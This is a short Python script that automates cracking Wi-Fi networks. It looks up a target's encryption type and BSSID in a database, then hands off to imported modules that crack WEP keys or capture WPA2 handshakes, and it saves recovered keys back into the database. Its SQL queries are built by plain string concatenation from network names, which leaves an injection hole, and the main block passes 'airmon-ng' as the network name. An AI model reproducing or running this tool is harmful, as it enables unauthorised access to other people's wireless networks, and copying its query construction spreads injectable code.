#!/usr/bin/python

import crack_wep
import socket
from database import *
import os
import capture_4_way_handshake

def crack_network(ESSID):
	query="select encryption from ap_info where caption= '"
	query+=socket.gethostname()
	query+="'and wifi_network='"
	query+=ESSID
	query+="';"
	result= executequery (query)
	encryption= result [0][0]
	query="select channel, mac_adress, quality from ap_info where caption = '"
	query+=socket.gethostname()
	query+="'and wifi_network ='"
	query+=(ESSID)
	query+="' order by 3 desc limit 1"
	result= executequery(query)
	channel=result[0][0]
	BSSID=result[0][1]
	print ("found encryption")
	if encryption=="WEP":
		crack_wep.automated_crack(ESSID, BSSID, channel)
		file= open ("/home/isis/key")
		key= file.read()
		query= "update ap_info set wifi_key = '"
		query+=key
		query+="' where wifi_network = '"
		query+=ESSID
		query+="';"
		executequery(query)
		file.close()
		os.remove("/home/isis/key")

	elif encryption=="WPA2 Version 1 PSK":
		capture_4_way_handshake.automated(BSSID, channel, ESSID)

	else:
		raise Exception("Cracking not supported")


if __name__ == '__main__':
	crack_network ("airmon-ng")
